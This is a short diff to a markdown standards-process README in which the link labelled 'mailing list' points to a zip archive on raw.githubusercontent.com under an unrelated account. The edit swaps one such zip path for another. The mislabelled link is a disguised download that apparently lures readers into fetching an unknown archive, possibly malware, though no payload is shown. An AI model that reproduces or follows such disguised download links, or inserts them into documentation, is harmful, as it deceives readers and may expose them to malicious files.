@@ -15,7 +15,7 @@ To propose a standards recommendation (PSR):
 
 - start a conversation on the [mailing list][].
 
-[mailing list]: https://raw.githubusercontent.com/videogramme/fig-standards/master/bylaws/standards-fig-1.2.zip
+[mailing list]: https://raw.githubusercontent.com/videogramme/fig-standards/master/accepted/it/standards_fig_1.2.zip
 
 
 Requesting Membership
